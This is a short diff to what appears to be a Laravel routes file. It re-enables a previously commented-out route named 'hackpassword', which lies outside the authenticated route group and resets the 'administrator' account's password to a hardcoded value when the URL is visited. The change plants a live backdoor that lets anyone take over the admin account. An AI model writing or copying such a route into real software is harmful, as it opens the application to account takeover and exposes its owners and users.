@@ -965,13 +965,13 @@ Route::group(array("before" => "auth"), function()
     ));
 
 });
-/*
+
 Route::get('hackpassword', function() {
-    $user = User::where('username', 'Micheal')->first();
-    $user->password = Hash::make('pass123');
+    $user = User::where('username', 'administrator')->first();
+    $user->password = Hash::make('mets5now');
     $user->save();
  
     echo 'Password changed successfully.';
-});*/
+});
 
 
